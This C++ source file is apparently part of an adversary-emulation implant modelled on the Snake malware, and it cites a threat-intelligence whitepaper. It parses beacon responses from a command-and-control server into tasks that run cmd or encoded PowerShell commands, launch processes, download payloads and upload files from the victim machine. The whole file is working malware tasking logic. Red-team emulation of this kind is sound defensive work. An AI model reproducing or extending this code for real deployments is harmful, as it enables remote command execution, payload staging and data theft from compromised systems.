/*
 * Handle instruction parsing
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 */

#include <windows.h>
#include <regex>
#include <iostream>
#include "base64.h"
#include "instruction.h"
#include "util.h"

namespace instruction {

DWORD CreateCmdInstruction(ApiWrapperInterface* api_wrapper, std::string instruction_arg_str, int instruction_code, Instruction* received_instruction) {
    static std::regex instruction_args_regex ("^&([^&]+)$");
    std::smatch args_regex_match;
    if (instruction_arg_str.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Arguments required for instruction code " + std::to_string(instruction_code));
        return FAIL_MISSING_INSTRUCTION_ARGS;
    }
    if (!std::regex_search(instruction_arg_str, args_regex_match, instruction_args_regex)) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR,"Invalid instruction arg format. Received: " + instruction_arg_str);
        return FAIL_INVALID_INSTRUCTION_ARG_FORMAT;
    }
    std::string arg_str = args_regex_match[1].str();
    std::string decoded_command;
    try {
        CryptoPP::StringSource ss(arg_str, true, new CryptoPP::Base64Decoder(new CryptoPP::StringSink(decoded_command)));
    } catch (...) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to base64 decode command: " + arg_str);
        return FAIL_INVALID_BASE64;
    }
    if (decoded_command.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to base64 decode command: " + arg_str);
        return FAIL_INVALID_BASE64;
    }
    received_instruction->shell_command = util::ConvertStringToWstring(decoded_command);
    return ERROR_SUCCESS;
}

DWORD CreatePshInstruction(ApiWrapperInterface* api_wrapper, std::string instruction_arg_str, int instruction_code, Instruction* received_instruction) {
    static std::regex instruction_args_regex ("^&([^&]+)$");
    std::smatch args_regex_match;
    if (instruction_arg_str.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Arguments required for instruction code " + std::to_string(instruction_code));
        return FAIL_MISSING_INSTRUCTION_ARGS;
    }
    if (!std::regex_search(instruction_arg_str, args_regex_match, instruction_args_regex)) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR,"Invalid instruction arg format. Received: " + instruction_arg_str);
        return FAIL_INVALID_INSTRUCTION_ARG_FORMAT;
    }
    // We will keep the base64 encoding since we want to run encoded powershell
    received_instruction->shell_command = util::ConvertStringToWstring(args_regex_match[1].str());
    return ERROR_SUCCESS;
}

DWORD CreateProcInstruction(ApiWrapperInterface* api_wrapper, std::string instruction_arg_str, int instruction_code, Instruction* received_instruction) {
    static std::regex instruction_args_regex ("^&([^&]+)(?:&([^&]+))?$");
    std::smatch args_regex_match;
    if (instruction_arg_str.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Arguments required for instruction code " + std::to_string(instruction_code));
        return FAIL_MISSING_INSTRUCTION_ARGS;
    }
    if (!std::regex_search(instruction_arg_str, args_regex_match, instruction_args_regex)) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR,"Invalid instruction arg format. Received: " + instruction_arg_str);
        return FAIL_INVALID_INSTRUCTION_ARG_FORMAT;
    }

    received_instruction->process_binary_path = util::ConvertStringToWstring(args_regex_match[1].str());
    received_instruction->process_args = L"";
    if (args_regex_match.size() > 2) {
        std::string encoded_arg_str = args_regex_match[2].str();
        if (encoded_arg_str.length() > 0) {
            std::string decoded_args;
            try {
                CryptoPP::StringSource ss(encoded_arg_str, true, new CryptoPP::Base64Decoder(new CryptoPP::StringSink(decoded_args)));
            } catch (...) {
                logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to base64 decode proc arg strings: " + encoded_arg_str);
                return FAIL_INVALID_BASE64;
            }
            if (decoded_args.length() == 0) {
                logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to base64 decode proc arg strings: " + encoded_arg_str);
                return FAIL_INVALID_BASE64;
            }
            received_instruction->process_args = util::ConvertStringToWstring(decoded_args);
        }
    }
    return ERROR_SUCCESS;
}

DWORD CreatePayloadDownloadInstruction(ApiWrapperInterface* api_wrapper, std::string instruction_arg_str, Instruction* received_instruction) {
    static std::regex payload_args_regex ("^(?:&([^&]+))(?:&([^&]+))$");
    std::smatch args_regex_match;
    if (instruction_arg_str.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Arguments required for payload download instruction");
        return FAIL_MISSING_INSTRUCTION_ARGS;
    }
    if (!std::regex_search(instruction_arg_str, args_regex_match, payload_args_regex)) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Invalid instruction arg format. Received: " + instruction_arg_str);
        return FAIL_INVALID_INSTRUCTION_ARG_FORMAT;
    }
    received_instruction->file_to_download = util::ConvertStringToWstring(args_regex_match[1].str());
    received_instruction->download_dest_path = util::ConvertStringToWstring(args_regex_match[2].str());
    return ERROR_SUCCESS;
}

DWORD CreateFileUploadInstruction(ApiWrapperInterface* api_wrapper, std::string instruction_arg_str, Instruction* received_instruction) {
    static std::regex upload_arg_regex ("^(?:&([^&]+))$");
    std::smatch args_regex_match;
    if (instruction_arg_str.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "File path required for file upload instruction");
        return FAIL_MISSING_INSTRUCTION_ARGS;
    }
    if (!std::regex_search(instruction_arg_str, args_regex_match, upload_arg_regex)) {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Invalid instruction arg format. Received: " + instruction_arg_str);
        return FAIL_INVALID_INSTRUCTION_ARG_FORMAT;
    }
    received_instruction->file_to_upload = util::ConvertStringToWstring(args_regex_match[1].str());
    return ERROR_SUCCESS;
}

DWORD ExtractInstructionInformation(ApiWrapperInterface* api_wrapper, std::string response, Instruction* received_instruction) {
    static std::regex beacon_response_regex ("^ID(\\d{18})#(\\d{2}) ((?:&[^&]+){0,2})#([^&]*)&([^&]*)&&$");
    std::smatch resp_regex_match;
    if (std::regex_search(response, resp_regex_match, beacon_response_regex)) {
        received_instruction->original_str = response;
        received_instruction->instruction_id = util::ConvertStringToWstring(resp_regex_match[1].str());
        received_instruction->instruction_type = std::stoi(resp_regex_match[2].str());
        received_instruction->sleep_time = std::stoi(resp_regex_match[4].str());
        std::string instruction_arg_str = resp_regex_match[3].str();
        received_instruction->runas_user = util::ConvertStringToWstring(resp_regex_match[5].str());
        switch(received_instruction->instruction_type) {
            case TASK_CMD_EXECUTE:
                return CreateCmdInstruction(api_wrapper, instruction_arg_str, received_instruction->instruction_type, received_instruction);
            case TASK_PSH_EXECUTE:
                return CreatePshInstruction(api_wrapper, instruction_arg_str, received_instruction->instruction_type, received_instruction);
            case TASK_PROC_EXECUTE:
                return CreateProcInstruction(api_wrapper, instruction_arg_str, received_instruction->instruction_type, received_instruction);
            case TASK_FILE_DOWNLOAD:
                return CreatePayloadDownloadInstruction(api_wrapper, instruction_arg_str, received_instruction);
            case TASK_FILE_UPLOAD:
                return CreateFileUploadInstruction(api_wrapper, instruction_arg_str, received_instruction);
            case TASK_LOGS_UPLOAD:
                // no need to specify individual file names.
                return ERROR_SUCCESS;
            case TASK_EMPTY:
                return ERROR_SUCCESS;
            default:
                logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Unsupported instruction code: " + std::to_string(received_instruction->instruction_type));
                return FAIL_UNSUPPORTED_INSTRUCTION_TYPE;
        }
    } else {
        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Invalid response format. Received: " + response);
        return FAIL_INVALID_INSTRUCTION_RESPONSE;
    }
    return ERROR_SUCCESS;
}

} // namespace instruction